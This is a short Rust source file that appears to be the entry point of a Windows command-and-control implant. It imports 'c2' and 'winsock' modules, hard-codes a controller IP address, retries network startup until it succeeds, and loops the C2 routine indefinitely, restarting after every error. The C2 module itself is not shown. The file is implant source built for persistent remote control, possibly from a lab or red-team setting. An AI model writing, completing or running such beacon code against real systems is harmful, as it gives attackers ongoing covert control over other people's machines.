use anyhow::Result;
use std::{
    thread::sleep,
    time::Duration,
};

mod c2;
mod winsock;

pub const DEST: [u8; 4] = [172, 30, 104, 9];

fn main() -> Result<()> {
    loop {
        if winsock::ws_startup().is_ok() {
            break;
        } else {
            eprintln!("winsock startup failed, retrying...");
            sleep(Duration::from_millis(500));
        }
    }

    loop {
        match c2::main_loop() {
            Ok(_) => return Ok(()),
            Err(e) => eprintln!("error in main loop: {}. restarting...", e),
        }
    }
}
